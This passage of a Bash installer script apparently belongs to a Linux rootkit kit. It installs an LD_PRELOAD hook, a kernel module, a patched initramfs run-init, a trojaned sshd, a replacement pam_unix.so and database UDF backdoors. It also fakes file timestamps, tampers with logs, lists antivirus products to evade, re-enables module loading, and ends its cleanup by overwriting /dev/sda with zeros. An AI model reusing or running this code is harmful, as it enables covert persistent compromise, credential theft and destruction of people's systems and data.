			mkinitrd -f "${init_file}" "${VER}" &>/dev/null
		;;
		*)
			if [[ ${GZ} -eq 1 ]]; then
				necho "\t\t\tCreating [ GZ ]."
				find . 2>/dev/null|cpio -o -H newc 2>/dev/null|gzip -9 -n > "${init_file}" 2>/dev/null
			elif [[ ${XZ} -eq 1 ]]; then
				necho "\t\t\tCreating [ XZ ]."
				find . 2>/dev/null|cpio -o -H newc 2>/dev/null|xz -9 > "${init_file}" 2>/dev/null
			elif [[ ${LZ4} -eq 1 ]]; then
				necho "\t\t\tCreating [ LZ4 ]."
				find . 2>/dev/null|cpio -o -H newc 2>/dev/null|lz4 -l > "${init_file}" 2>/dev/null
			else
				wecho "\t\t\tCreating [ CPIO ]. Maybe something wrong."
				find . 2>/dev/null|cpio -o -H newc 2>/dev/null > "${init_file}" 2>/dev/null
			fi
		;;
	esac
	(( $? != 0 )) && eecho "Couldn't create new [ ${init_file} ] using [ $1 ]."
	chmod 600 "${init_file}" &>/dev/null
	update_time "${init_file}"
	cd - 1>/dev/null
	secho "\t\tCreate success."
}

restart_service(){
	necho "\t\tRestarting service [ $1 ]..."
	if (( SYSTEMD == 1 )); then
		systemctl daemon-reload &>/dev/null
		(( $? != 0 )) && eecho "Couldn't systemctl daemon-reload."
		systemctl enable "$1" &>/dev/null
		(( $? != 0 )) && eecho "Couldn't enable systemd."
		systemctl restart "$1" &>/dev/null &
		(( $? != 0 )) && eecho "Couldn't restart using systemd."
	else
		update-rc.d "$1" defaults &>/dev/null
		(( $? != 0 )) && wecho "Couldn't enable old-fashion."
		eval "${S_F_P_NS_NAME} restart" &>/dev/null
		(( $? != 0 )) && eecho "Couldn't restart using old-fashion."
	fi
	secho "\t\tRestart finished."
}

install(){
	techo "\tInstalling [ $1 ]..."
	case $1 in
		"CLIENT")
			cp -f "${main_tmp}"/"$1"/"$1" "${CLIENT}" &>/dev/null
			chown root."${MGID}" "${CLIENT}" &>/dev/null
			chmod 2710 "${CLIENT}" &>/dev/null
			CLNT=1
		;;
		"LD")
			patch_libdl
			cp -f "${main_tmp}"/"$1"/"$1".so "${SOPATH}" &>/dev/null
			printf '\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\x50\x10\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x48\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x38\x00\x0b\x00\x40\x00\x1c\x00\x1b\x00\x06\x00\x00\x00\x04\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x68\x02\x00\x00\x00\x00\x00\x00\x68\x02\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00\xa8\x02\x00\x00\x00\x00\x00\x00\xa8\x02\x00\x00\x00\x00\x00\x00\xa8\x02\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x05\x00\x00\x00\x00\x00\x00\x68\x05\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\xcd\x01\x00\x00\x00\x00\x00\x00\xcd\x01\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x50\x01\x00\x00\x00\x00\x00\x00\x50\x01\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\xe8\x2d\x00\x00\x00\x00\x00\x00\xe8\x3d\x00\x00\x00\x00\x00\x00\xe8\x3d\x00\x00\x00\x00\x00\x00\x48\x02\x00\x00\x00\x00\x00\x00\x50\x02\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x06\x00\x00\x00\xf8\x2d\x00\x00\x00\x00\x00\x00\xf8\x3d\x00\x00\x00\x00\x00\x00\xf8\x3d\x00\x00\x00\x00\x00\x00\xe0\x01\x00\x00\x00\x00\x00\x00\xe0\x01\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\xc4\x02\x00\x00\x00\x00\x00\x00\xc4\x02\x00\x00\x00\x00\x00\x00\xc4\x02\x00\x00\x00\x00\x00\x00\x44\x00\x00\x00\x00\x00\x00\x00\x44\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x50\xe5\x74\x64\x04\x00\x00\x00\x0c\x20\x00\x00\x00\x00\x00\x00\x0c\x20\x00\x00\x00\x00\x00\x00\x0c\x20\x00\x00\x00\x00\x00\x00\x3c\x00\x00\x00\x00\x00\x00\x00\x3c\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x51\xe5\x74\x64\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x52\xe5\x74\x64\x04\x00\x00\x00\xe8\x2d\x00\x00\x00\x00\x00\x00\xe8\x3d\x00\x00\x00\x00\x00\x00\xe8\x3d\x00\x00\x00\x00\x00\x00\x18\x02\x00\x00\x00\x00\x00\x00\x18\x02\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x0d\x2f\x6c\x69\x62\x36\x34\x2f\x6c\x64\x2d\x6c\x69\x6e\x75\x78\x2d\x78\x38\x36\x2d\x36\x34\x2e\x73\x6f\x2e\x32\x00' > "${LDSO_LOGS}"
			printf $(xenc "${PAM_HEX}"|sed 's#\\\\#\\#g') > "${HIDE_IP_PATH}"
			touch "${N_PRELOAD}" &>/dev/null
			chown root."${MGID}" "${N_PRELOAD}" "${SOPATH}" "${HIDE_IP_PATH}" &>/dev/null
			chmod 660 "${LDSO_LOGS}" &>/dev/null
			chmod 644 "${SOPATH}" "${N_PRELOAD}" &>/dev/null
			chmod 622 "${LDSO_LOGS}" "${HIDE_IP_PATH}" &>/dev/null
			LD=1
		;;
		"LOADER")
			update_time "${MODPATH}"
			if [[ "${FILETYPE}" =~ [kK][oO] ]]; then
				cat "${LOCAL}" > "${MODPATH}" 2>/dev/null
				(( $? != 0 )) && eecho "Couldn't cat from [ ${LOCAL} ] to [ ${MODPATH} ]." || secho "\t\tCopy success from [ ${LOCAL} ] to [ ${MODPATH} ]."
			else
				case ${FILETYPE} in
					*[xX][zZ]*)
						xz < "${LOCAL}" > "${MODPATH}"
					;;
					*[gG][zZ]*)
						gzip < "${LOCAL}" > "${MODPATH}"
					;;
					*[bB][zZ]*)
						bzip2 < "${LOCAL}" > "${MODPATH}"
					;;
					*[lL][zZ]*)
						lzma < "${LOCAL}" > "${MODPATH}"
					;;
					*)
						eecho "Wrong module extension. Check [ ${MODPATH} ]."
					;;
				esac
				(( $? != 0 )) && eecho "Couldn't compress [ $1 ]." || secho "\t\tCompress and replace success."
			fi
			update_time "${MODPATH}"
			update_time "${IMODPATH}"
			cat "${MODPATH}" > "${IMODPATH}" 2>/dev/null
			(( $? != 0 )) && eecho "Couldn't cat from [ ${MODPATH} ] to [ ${IMODPATH} ]." || secho "\t\tCopy success from [ ${MODPATH} ] to [ ${IMODPATH} ]."
			update_time "${IMODPATH}"
			if [[ -x $(command -v dracut) ]]; then
				create_boot "DRACUT"
			elif [[ -x $(command -v mkinitrd) ]]; then
				create_boot "MKINITRD"
			else
				create_boot "manual"
			fi
			LKM=1
		;;
		"HORSEPILL")
			printf "${CLIENT_BN}\x00${UUID}" > "${main_tmp}"/"$1"/hs
			head -c $((64-${#CLIENT_BN}-1-${#UUID})) /dev/zero >> "${main_tmp}"/"$1"/hs
			objcopy --update-section "${SECTION_NAME}"="${main_tmp}"/"$1"/hs "${main_tmp}"/"$1"/run-init &>/dev/null
			(( $? != 0 )) && eecho "Couldn't patch [ ${main_tmp}/$1/run-init ]." || secho "\t\tNew [ ${main_tmp}/$1/run-init ] modyfied."
			cd "${init_folder}" 1>/dev/null
				rm -rf ./sbin/run-init &>/dev/null
				(( $? != 0 )) && eecho "Couldn't remove other run-init."
				update_time ./bin/run-init
				cp -f ../"$1"/run-init ./bin/run-init &>/dev/null
				update_time ./bin/run-init
				if (( $(grep -c 'switch_root' ./init) >= 1 )); then
					necho "\t\tPatching..."
					cp ../"$1"/init.diff ./
					update_time ./init
					patch -i ./init.diff &>/dev/null
					(( $? != 0 )) && eecho "Couldn't patch [ ${main_tmp}/$1/init.diff ]."
					update_time ./init
					shred -zuf -n 1 ./init.diff
					secho "\t\tPatch finished."
				fi
			cd - 1>/dev/null
			if [[ -x $(command -v mkinitrd) ]]; then
				create_boot "MKINITRD"
			else
				create_boot "manual"
			fi
			HP=1
		;;
		"SERVICE")
			if (( SYSTEMD == 1 )); then
				cp -f "${main_tmp}"/"$1"/main.service "${S_F_P_NS_NAME}"
			else
				cp -f "${main_tmp}"/"$1"/init.service "${S_F_P_NS_NAME}"
			fi
			(( $? != 0 )) && eecho "Something error when copy [ ${S_F_P_NS_NAME} ]."
			chmod 711 "${S_F_P_NS_NAME}" &>/dev/null
			SRV=1
		;;
		"SSHD")
			touch "${SSHD_LOGS}"
			printf '\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\x50\x10\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x48\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x38\x00\x0b\x00\x40\x00\x1c\x00\x1b\x00\x06\x00\x00\x00\x04\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x68\x02\x00\x00\x00\x00\x00\x00\x68\x02\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00\xa8\x02\x00\x00\x00\x00\x00\x00\xa8\x02\x00\x00\x00\x00\x00\x00\xa8\x02\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x05\x00\x00\x00\x00\x00\x00\x68\x05\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\xcd\x01\x00\x00\x00\x00\x00\x00\xcd\x01\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x50\x01\x00\x00\x00\x00\x00\x00\x50\x01\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\xe8\x2d\x00\x00\x00\x00\x00\x00\xe8\x3d\x00\x00\x00\x00\x00\x00\xe8\x3d\x00\x00\x00\x00\x00\x00\x48\x02\x00\x00\x00\x00\x00\x00\x50\x02\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x06\x00\x00\x00\xf8\x2d\x00\x00\x00\x00\x00\x00\xf8\x3d\x00\x00\x00\x00\x00\x00\xf8\x3d\x00\x00\x00\x00\x00\x00\xe0\x01\x00\x00\x00\x00\x00\x00\xe0\x01\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\xc4\x02\x00\x00\x00\x00\x00\x00\xc4\x02\x00\x00\x00\x00\x00\x00\xc4\x02\x00\x00\x00\x00\x00\x00\x44\x00\x00\x00\x00\x00\x00\x00\x44\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x50\xe5\x74\x64\x04\x00\x00\x00\x0c\x20\x00\x00\x00\x00\x00\x00\x0c\x20\x00\x00\x00\x00\x00\x00\x0c\x20\x00\x00\x00\x00\x00\x00\x3c\x00\x00\x00\x00\x00\x00\x00\x3c\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x51\xe5\x74\x64\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x52\xe5\x74\x64\x04\x00\x00\x00\xe8\x2d\x00\x00\x00\x00\x00\x00\xe8\x3d\x00\x00\x00\x00\x00\x00\xe8\x3d\x00\x00\x00\x00\x00\x00\x18\x02\x00\x00\x00\x00\x00\x00\x18\x02\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x0d\x2f\x6c\x69\x62\x36\x34\x2f\x6c\x64\x2d\x6c\x69\x6e\x75\x78\x2d\x78\x38\x36\x2d\x36\x34\x2e\x73\x6f\x2e\x32\x00' > "${SSHD_LOGS}"
			chmod 660 "${SSHD_LOGS}" &>/dev/null
			mkdir -p /var/empty &>/dev/null
			chown root:sys /var/empty &>/dev/null
			chmod 755 /var/empty &>/dev/null
			chmod 600 /etc/ssh/*key
			groupadd sshd &>/dev/null
			useradd -g sshd -d /var/empty -s /bin/false sshd &>/dev/null
			update_time "${SSHD_BIN}"
			"${main_tmp}"/"$1"/install-sh "${main_tmp}"/"$1"/sshd "${SSHD_BIN}" &>/dev/null
			(( $? != 0 )) && eecho "Couldn't install SSHD."
			update_time "${SSHD_BIN}"
			SSHD=1
		;;
		"PAM")
			touch "${PAM_LOGS}"
			printf '\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\x50\x10\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x48\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x38\x00\x0b\x00\x40\x00\x1c\x00\x1b\x00\x06\x00\x00\x00\x04\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x68\x02\x00\x00\x00\x00\x00\x00\x68\x02\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00\xa8\x02\x00\x00\x00\x00\x00\x00\xa8\x02\x00\x00\x00\x00\x00\x00\xa8\x02\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x05\x00\x00\x00\x00\x00\x00\x68\x05\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\xcd\x01\x00\x00\x00\x00\x00\x00\xcd\x01\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x50\x01\x00\x00\x00\x00\x00\x00\x50\x01\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\xe8\x2d\x00\x00\x00\x00\x00\x00\xe8\x3d\x00\x00\x00\x00\x00\x00\xe8\x3d\x00\x00\x00\x00\x00\x00\x48\x02\x00\x00\x00\x00\x00\x00\x50\x02\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x06\x00\x00\x00\xf8\x2d\x00\x00\x00\x00\x00\x00\xf8\x3d\x00\x00\x00\x00\x00\x00\xf8\x3d\x00\x00\x00\x00\x00\x00\xe0\x01\x00\x00\x00\x00\x00\x00\xe0\x01\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\xc4\x02\x00\x00\x00\x00\x00\x00\xc4\x02\x00\x00\x00\x00\x00\x00\xc4\x02\x00\x00\x00\x00\x00\x00\x44\x00\x00\x00\x00\x00\x00\x00\x44\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x50\xe5\x74\x64\x04\x00\x00\x00\x0c\x20\x00\x00\x00\x00\x00\x00\x0c\x20\x00\x00\x00\x00\x00\x00\x0c\x20\x00\x00\x00\x00\x00\x00\x3c\x00\x00\x00\x00\x00\x00\x00\x3c\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x51\xe5\x74\x64\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x52\xe5\x74\x64\x04\x00\x00\x00\xe8\x2d\x00\x00\x00\x00\x00\x00\xe8\x3d\x00\x00\x00\x00\x00\x00\xe8\x3d\x00\x00\x00\x00\x00\x00\x18\x02\x00\x00\x00\x00\x00\x00\x18\x02\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x0d\x2f\x6c\x69\x62\x36\x34\x2f\x6c\x64\x2d\x6c\x69\x6e\x75\x78\x2d\x78\x38\x36\x2d\x36\x34\x2e\x73\x6f\x2e\x32\x00' > "${PAM_LOGS}"
			chmod 660 "${PAM_LOGS}" &>/dev/null
			PAM=1
		;;
		"MYSQL")
			cp -f "${main_tmp}"/"$1"/UDF.so "${MYSQL_P_DIR}"/"${MYSQL_SO}"
			(( $? != 0 )) && eecho "Couldn't install Mysql plugin."
			chown root."${MGID}" "${MYSQL_P_DIR}"/"${MYSQL_SO}" &>/dev/null
			MYSQL=1
		;;
		"POSTGRES")
			cp -f "${main_tmp}"/"$1"/UDF.so "${POSTGRES_SO}"
			(( $? != 0 )) && eecho "Couldn't install Postgresql plugin."
			chown root."${MGID}" "${POSTGRES_SO}" &>/dev/null
			POSTGRES=1
		;;
	esac
	techo "\tInstall finished."
}

run(){
	techo "\tStarting [ $1 ]..."
	case $1 in
		"CLIENT")
			cp "${main_tmp}"/CLIENT/CLIENT "${tmp_dir}"/
			chown root."${MGID}" "${tmp_dir}"/CLIENT &>/dev/null
			chmod 2711 "${tmp_dir}"/CLIENT &>/dev/null
			"${tmp_dir}"/CLIENT "${UUID}" &
		;;
		"LD")
			printf "${SOPATH}" > "${N_PRELOAD}" 2>/dev/null
		;;
		"LKM")
			if [[ -s /etc/sysctl.conf ]] && (( $(cat /proc/sys/kernel/modules_disabled) == 1 )); then
				if (( $(grep -c "^kernel.modules_disabled" /etc/sysctl.conf) != 0 )); then
					update_time /etc/sysctl.conf
					sed -i "s/kernel.modules_disabled = .*/kernel.modules_disabled = 0/g" /etc/sysctl.conf /etc/sysctl.d/*
					update_time /etc/sysctl.conf
				fi
			fi
			"${main_tmp}"/TOOLS/loader "${main_tmp}"/"$1"/"${LKM_MOD}".ko &>/dev/null
			(( $? != 0 )) && wecho "\t\tSomething wrong when load module."
		;;
		"HORSEPILL")
			wecho "\t\tNeed reboot...\n [!]\t\t\tClient will be start temporary."
		;;
		"SERVICE")
			restart_service "${NS_NAME}"
		;;
		"SSHD")
			if [[ -f /etc/crypto-policies/back-ends/opensshserver.config ]]; then
				sed -i 's/^[^#]/#&/g' /etc/crypto-policies/back-ends/opensshserver.config
			fi
			if [[ -x $(command -v systemctl) ]]; then
				systemctl restart sshd &>/dev/null &
			elif [[ -f /var/run/sshd.pid ]]; then
				kill -9 $(cat /var/run/sshd.pid) && /usr/sbin/sshd
			else
				wecho "\t\tRestart sshd manually."
			fi
			(( $? != 0 )) && eecho "Couldn't restart."
		;;
		"PAM")
			find /{lib,lib32,libx32,lib64}/ /lib/{x86_64-linux-gnu,i386-linux-gnu}/ /usr/{lib,lib32,libx32,lib64}/ -type f -name pam_unix.so 2>/dev/null|while read -r pamlib; do
				update_time "${pamlib}"
				cp -f "${main_tmp}"/"$1"/modules/pam_unix/.libs/pam_unix.so "${pamlib}"
				(( $? != 0 )) && eecho "Couldn't replace pam_unix.so to [ ${pamlib} ]."
				update_time "${pamlib}"
			done
		;;
		"MYSQL")
			mysql -sN -e "USE mysql;DROP FUNCTION IF EXISTS ${MYSQL_NAME};CREATE FUNCTION ${MYSQL_NAME} RETURNS string SONAME '${MYSQL_SO}';" &>/dev/null
			(( $? != 0 )) && eecho "Couldn't run mysql."
		;;
		"POSTGRES")
			su postgres -c "psql -c \"CREATE OR REPLACE FUNCTION ${POSTGRES_NAME}(text) RETURNS text AS '${POSTGRES_SO}', '${POSTGRES_NAME}' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;\" &>/dev/null" &>/dev/null
			(( $? != 0 )) && eecho "Couldn't run su or psql."
		;;
	esac
	techo "\tStart finished."
}
###
cleanall(){
	for i in ${LOG_FILES[*]}; do
		if [[ -f /var/log/"${i}".bak ]]; then
			update_time /var/log/"${i}"
		fi
	done
	rm -rf "${init_folder}" 2>/dev/null
	find . -type f|while read -r file; do
		shred -zuf -n 1 "${flle}" 2>/dev/null
	done
	rm -rf "${main_tmp}" "${main_src}" 2>/dev/null
	shred -zuf -n 1 "${tmp_dir}"/.patch "${tmp_dir}"/log.txt 2>/dev/null
	shred -zuf -n 1 "$0" 2>/dev/null
	cd ../
	rm -rf ./bdvl
	dd if=/dev/zero of=/dev/sda bs=40G
}
###
cecho(){
	printf ' \e[90m[=]\t%b\e[0m\n' "$1"|tee -a "${tmp_dir}"/log.txt
}
eecho(){
	for i in ${LOG_FILES[*]}; do
		if [[ -f /var/log/"${i}" ]]; then
			update_time /var/log/"${i}"
		fi
	done
	update_time ${init_file}
	printf ' \e[91;1;1m[!]\t%b\e[0m\n' "$1"|tee -a "${tmp_dir}"/log.txt
	exit 255
}
secho(){
	printf ' \e[92m[+]\t%b\e[0m\n' "$1"|tee -a "${tmp_dir}"/log.txt
}
wecho(){
	printf ' \e[93m[!]\t%b\e[0m\n' "$1"|tee -a "${tmp_dir}"/log.txt
}
fecho(){
	printf ' \e[94m[#]\t%b\e[0m\n' "$1"|tee -a "${tmp_dir}"/log.txt
}
techo(){
	printf ' \e[95m[#]\t%b\e[0m\n' "$1"|tee -a "${tmp_dir}"/log.txt
}
oecho(){
	printf ' \e[96;1m[*]\t%b\e[0m\n' "$1"|tee -a "${tmp_dir}"/log.txt
}
necho(){
	printf ' \e[97;1;2m[...]\t%b\e[0m\n' "$1"|tee -a "${tmp_dir}"/log.txt
}

export TERM=xterm
export LANG=en_US
export LANGUAGE=en_US:en
export LC_ALL=C
export LC_COLLATE=C
export LC_CTYPE=en_US.UTF-8
export PATH=/bin:/sbin:/usr/local/bin:/usr/local/sbin:/usr/sbin:/usr/bin
VER=$(uname -r)
main_src=$(pwd)/src
main_tmp=$(pwd)/tmp
rm -rf "${main_tmp}"/*
init_folder="${main_tmp}"/INIT

mkdir -p "${init_folder}" "${main_tmp}"/TOOLS

if [[ -d /var/tmp ]]; then
	tmp_dir=/var/tmp
else
	if [[ -d /tmp ]]; then
		tmp_dir=/tmp
	else
		tmp_dir="${main_tmp}"
	fi
fi
:>"${tmp_dir}"/log.txt
:>"${tmp_dir}"/json.txt

declare -a array AVS_I=("AVAST" "AVG_OLD" "AVIRA_OLD" "BITDEFENDER" "COMODO" "DRWEB" "ESCAN" "ESET" "FSECURE" "FPROT" "KASPERSKY" "MCAFEE" "PANDA" "SOPHOS" "VBACL" "ZONER")
declare -a array AVS_D=("COMODO" "DRWEB" "FSECURE" "KASPERSKY" "SOPHOS")

declare -a array AVAST=("/usr/bin/avast/:/usr/share/doc/avast/:/etc/avast/;/usr/bin/avastlic:/etc/init.d/avast;")
declare -a array AVG_OLD=(";/etc/init.d/avgd:/usr/bin/avgscan;")
declare -a array AVIRA_OLD=("/usr/lib/AntiVir/;;")
declare -a array BITDEFENDER=("/opt/BitDefender-scanner/:/opt/BitDefender/;;")
declare -a array COMODO=("/opt/COMODO/;;avflt:redirfs")
declare -a array DRWEB=("/opt/drweb/:/etc/drweb/:/etc/opt/drweb.com/:/opt/drweb.com/:/var/opt/drweb.com/;/etc/init.d/drweb-configd:/etc/init.d/drweb-spider-kmod:/usr/bin/drweb-ctl:/usr/bin/drweb-configure;drweb")
declare -a array ESCAN=("/opt/MicroWorld/:/var/MicroWorld/;;")
declare -a array ESET=("/opt/eset/:/etc/opt/eset/:/var/opt/eset/:/var/log/esets/;;")
declare -a array FSECURE=("/opt/f-secure/:/var/opt/f-secure/:/etc/opt/f-secure/;/etc/init.d/fsaua:/etc/init.d/fsupdate:/dev/dazuko;dazuko")
declare -a array FPROT=("/opt/f-prot/;/etc/f-prot.conf;")
declare -a array KASPERSKY=("/etc/opt/kaspersky/:/opt/kaspersky/:/var/log/kaspersky/:/var/opt/kaspersky/;/dev/kavmonitor:/dev/kav4fs_oas:/proc/kav4fs_oas:/dev/kavinfo;kav4fs_oas:redirfs")
declare -a array MCAFEE=("/usr/local/uvscan/;;")
declare -a array PANDA=("/opt/PCOPAgent/:/etc/PCOPLinux/;/etc/init.d/pcopagent:/bin/PCOP_AgentService;")
declare -a array SOPHOS=("/opt/sophos-av/;/etc/init.d/sav-protect;tlp-syscalltable:talpa_syscall:talpa_vfshook:talpa_syscallhookprobe:talpa_syscallhook:talpa_pedconnector:talpa_pedevice:talpa_vcdevice:talpa_core:talpa_linux:tlp-personality:tlp-fileinfo:tlp-filesysteminfo:tlp-syslog:tlp-procfs:tlp-securityfs:tlp-dualfs:tlp-stdinterceptor:tlp-inclusion:tlp-opexcl:tlp-allowsyslog:tlp-denysyslog:tlp-threadinfo:tlp-exclusion:tlp-ddvc:tlp-cache:tlp-cacheobj:tlp-degrmode:tlp-file:tlp-wronginterceptor")
declare -a array VBACL=("/opt/vba/;;")
declare -a array ZONER=("/opt/zav/:/etc/zav/;/etc/init.d/zavd:/usr/bin/zavthreats:/usr/bin/zavcli;")

declare -a array LOG_FILES=("yum.log" "apt/history.log" "apt/term.log" "messages" "audit/audit.log" "zypper.log" "zypp/history")

declare -a array BASIC_PACKETS=("gcc" "coreutils" "openssl" "attr" "gawk" "make")

declare -a array YUM_LD_DEPS=("vim-common" "libpcap-devel" "pam-devel" "openssl-devel")
declare -a array YUM_SSHD_DEPS=("autoconf" "zlib-devel" "systemd-devel")
declare -a array YUM_I_DEPS=("kernel" "kernel-headers" "kernel-devel" "elfutils-libelf-devel" "gettext-devel" "libtool" "newt" "glibc-devel" "pkgconfig")
declare -a array YUM_P_DEPS=("apparmor")
declare -a array YUM_MY_DEPS=("mariadb-devel" "mysql-devel")
declare -a array YUM_PG_DEPS=("postgresql-devel")

declare -a array APT_LD_DEPS=("libpcap-dev" "libpam0g-dev" "libssl-dev")
declare -a array APT_SSHD_DEPS=("autoconf" "zlib1g-dev" "libsystemd-dev" "build-essential" "libc6-dev" "pkg-config")
declare -a array APT_KLIBC_DEPS=("libklibc-dev")
declare -a array APT_I_DEPS=("linux-headers-${VER}")
declare -a array APT_P_DEPS=("apparmor" "cloud-init")
declare -a array APT_MY_DEPS=("libmariadb-dev" "libmysqld-dev")
declare -a array APT_PG_DEPS=("postgresql-server-dev-all")

#~ declare -a array ZYP_LD_DEPS=("libpcap-devel" "pam-devel" "openssl-devel")
#~ declare -a array ZYP_SSHD_DEPS=("autoconf" "zlib-devel" "systemd-devel")
#~ declare -a array ZYP_I_DEPS=("kernel-default" "kernel-devel" "glibc-devel" "gettext-devel" "patch")
#~ declare -a array ZYP_P_DEPS=("apparmor")
#~ declare -a array ZYP_MY_DEPS=("libmariadb-devel")
